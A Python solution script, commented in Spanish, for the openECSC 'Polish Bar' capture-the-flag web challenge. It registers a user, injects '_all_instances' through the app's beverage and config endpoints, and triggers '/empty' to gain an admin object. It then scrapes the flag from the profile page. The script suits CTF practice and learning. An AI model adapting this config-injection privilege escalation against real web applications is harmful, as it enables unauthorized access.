"""
Polish Bar Exploit Script
Exploit para obtener la flag
"""

import requests
import re
from bs4 import BeautifulSoup

# Configuración
TARGET_URL = "https://5e23955f-f14f-4aba-900e-a43fc60d5fc0.openec.sc:1337/" # Cambiar esto por el link generado por la pagina o el url localhost generado al inicializarlo en docker
USERNAME = "hacker"
PASSWORD = "test"

def print_banner():
    print("=" * 60)
    print("Polish Bar Exploit")
    print("=" * 60)
    print()

def exploit():
    # Crear sesión para mantener las cookies
    session = requests.Session()
    
    print("[*] Paso 1: Registrando usuario...")
    response = session.post(
        f"{TARGET_URL}/register",
        data={
            "username": USERNAME,
            "password": PASSWORD
        },
        allow_redirects=True
    )
    
    if response.status_code == 200:
        print(f"[+] Usuario '{USERNAME}' registrado exitosamente")
    else:
        print(f"[-] Error al registrar usuario: {response.status_code}")
        return
    
    print("\n[*] Paso 2: Agregando '_all_instances' al estante...")
    response = session.post(
        f"{TARGET_URL}/beverage",
        data={"beverage": "_all_instances"}
    )
    
    if response.status_code == 200:
        print("[+] '_all_instances' agregado al estante")
    else:
        print(f"[-] Error al agregar bebida: {response.status_code}")
        return
    
    print("\n[*] Paso 3: Reemplazando 'alcohol_shelf' con '_all_instances'...")
    response = session.post(
        f"{TARGET_URL}/config",
        data={
            "config": "alcohol_shelf",
            "value": "_all_instances"
        }
    )
    
    if response.status_code == 200:
        print("[+] 'alcohol_shelf' reemplazado exitosamente")
    else:
        print(f"[-] Error al reemplazar: {response.status_code}")
        return
    
    print("\n[*] Paso 4: Ejecutando 'empty' para obtener objeto admin...")
    response = session.post(f"{TARGET_URL}/empty")
    
    if response.status_code == 200:
        print("[+] Comando 'empty' ejecutado exitosamente")
    else:
        print(f"[-] Error al ejecutar empty: {response.status_code}")
        return
    
    print("\n[*] Paso 5: Obteniendo perfil con la flag...")
    response = session.get(f"{TARGET_URL}/profile")
    
    if response.status_code == 200:
        print("[+] Perfil obtenido exitosamente\n")
        
        # Parsear HTML para extraer la flag
        soup = BeautifulSoup(response.text, 'html.parser')
        preferred_beverage = soup.find('div', class_='preferred-beverage')
        
        if preferred_beverage:
            flag = preferred_beverage.get_text(strip=True)
            print("=" * 60)
            print(f"🚩 FLAG ENCONTRADA: {flag}")
            print("=" * 60)
        else:
            # Buscar con regex si BeautifulSoup falla
            flag_match = re.search(r'openECSC\{[^}]+\}', response.text)
            if flag_match:
                print("=" * 60)
                print(f"🚩 FLAG ENCONTRADA: {flag_match.group(0)}")
                print("=" * 60)
            else:
                print("[-] No se pudo extraer la flag del HTML")
                print("\n[DEBUG] Buscando 'preferred-beverage' en el HTML...")
                if 'preferred-beverage' in response.text:
                    start = response.text.find('preferred-beverage')
                    print(response.text[start:start+200])
    else:
        print(f"[-] Error al obtener perfil: {response.status_code}")

if __name__ == "__main__":
    print_banner()
    try:
        exploit()
    except requests.exceptions.ConnectionError:
        print("[-] Error: No se pudo conectar al servidor")
        print("[-] Asegúrate de que la aplicación esté corriendo en http://localhost")
    except Exception as e:
        print(f"[-] Error inesperado: {e}")

